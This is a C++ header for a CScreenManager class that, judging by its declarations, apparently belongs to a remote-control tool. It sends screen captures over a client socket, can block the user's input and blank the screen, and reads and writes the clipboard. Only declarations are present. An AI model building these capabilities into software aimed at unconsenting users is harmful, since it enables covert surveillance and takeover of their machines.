// ScreenManager.h: interface for the CScreenManager class.
//
//////////////////////////////////////////////////////////////////////

#if !defined(AFX_SCREENMANAGER_H__5B96D465_6C5B_4A8A_B685_C2E6D6121227__INCLUDED_)
#define AFX_SCREENMANAGER_H__5B96D465_6C5B_4A8A_B685_C2E6D6121227__INCLUDED_

#if _MSC_VER > 1000
#pragma once

#include "Manager.h"
#include "ScreenSpy.h"
#endif // _MSC_VER > 1000

#define ALGORITHM_DIFF	1
class CScreenManager : public CManager
{
public:
	CScreenManager(CClientSocket *pClient);
	virtual ~CScreenManager();

private:
	int	m_biBitCount;
	CScreenSpy	*m_pScreenSpy;
	HANDLE	m_hWorkThread, m_hBlankThread;
	bool m_bIsWorking;
	bool m_bIsBlockInput;
	BYTE	m_bAlgorithm;
	bool	m_bIsCaptureLayer;
	static DWORD WINAPI WorkThread(LPVOID lparam);
	static DWORD WINAPI ControlThread(LPVOID lparam);
	void CScreenManager::sendBitMapInfo();
	void CScreenManager::sendFirstScreen();
	void CScreenManager::sendNextScreen();
	void CScreenManager::OnReceive(LPBYTE lpBuffer, UINT nSize);
	void CScreenManager::ProcessCommand(LPBYTE lpBuffer, UINT nSize);
	void CScreenManager::ResetScreen(int biBitCount);
	void CScreenManager::SendLocalClipboard();
	void CScreenManager::UpdateLocalClipboard(char *buf, int len);


};

#endif // !defined(AFX_SCREENMANAGER_H__5B96D465_6C5B_4A8A_B685_C2E6D6121227__INCLUDED_)
